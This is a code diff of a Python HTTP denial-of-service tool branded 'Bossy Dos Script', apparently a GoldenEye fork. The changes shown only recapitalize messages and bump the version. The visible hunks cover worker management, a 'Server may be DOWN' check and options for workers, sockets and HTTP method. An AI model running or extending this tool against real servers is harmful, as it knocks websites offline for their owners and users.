@@ -150,10 +150,10 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "{0} GoldenEye strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
+                print "{0} GoldenEye Strikes Deferred . ({1} Failed)".format(self.counter[0], self.counter[1])
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print "\tServer may be DOWN!"
+                    print "\t[!]Server May be DOWN !"
     
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
@@ -172,11 +172,11 @@ class GoldenEye(object):
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print "CTRL+C received. Killing all workers"
+                print "CTRL + C Received Killing All Workers"
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print "Killing worker {0}".format(worker.name)
+                            print "Killing Worker {0}".format(worker.name)
                         #worker.terminate()
                         worker.stop()
                     except Exception, ex:
@@ -268,7 +268,7 @@ class Striker(Process):
     def run(self):
 
         if DEBUG:
-            print "Starting worker {0}".format(self.name)
+            print "Starting Worker {0}".format(self.name)
 
         while self.runnable:
 
@@ -309,7 +309,7 @@ class Striker(Process):
                     pass # silently ignore
 
         if DEBUG:
-            print "Worker {0} completed run. Sleeping...".format(self.name)
+            print "Worker {0} Completed Run Sleeping . . .".format(self.name)
             
     def closeConnections(self):
         for conn in self.socks:
@@ -502,7 +502,7 @@ class Striker(Process):
 def usage():
     print (" ")
     print (" ")
-    print ' Bossy Dos Script v.1 https://www.aspartim.org/ '
+    print ' Bossy Dos Script v.2 https://www.aspartim.org/ '
     print '   ____  _____ ____   ____  ____  ______  ____  ___ ___  '
     print '  /    |/ ___/|    \ /    ||    \|      ||    ||   |   | '
     print ' |  o  (   \_ |  o  )  o  ||  D  )      | |  | | _   _ | '
@@ -515,13 +515,13 @@ def usage():
     print (" ")
     print ' OPTIONS : '
     print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
-    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
-    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
-    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
-    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
-    print '\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)'
+    print '\t -u, --useragents\tFile With User-Agents To Use\t\t\t\t(default: randomly generated)'
+    print '\t -w, --workers\t\tNumber Of Concurrent Workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
+    print '\t -s, --sockets\t\tNumber Of Concurrent Sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
+    print '\t -m, --method\t\tHTTP Method To Use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
+    print '\t -n, --nosslcheck\tDo Not Verify SSL Certificate\t\t\t\t(default: True)'
     print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
-    print '\t -h, --help\t\tShows this help'
+    print '\t -h, --help\t\tShows This Help'
     print (" ")
     print (" ")
 
@@ -541,7 +541,7 @@ def main():
     try:
 
         if len(sys.argv) < 2:
-            error('Please supply at least the URL')
+            error('Please Supply At Least The URL')
 
         url = sys.argv[1]
 
@@ -550,10 +550,10 @@ def main():
             sys.exit()
 
         if url[0:4].lower() != 'http':
-            error("Invalid URL supplied")
+            error("Invalid URL Supplied")
 
         if url == None:
-            error("No URL supplied")
+            error("No URL Supplied")
 
         opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
 
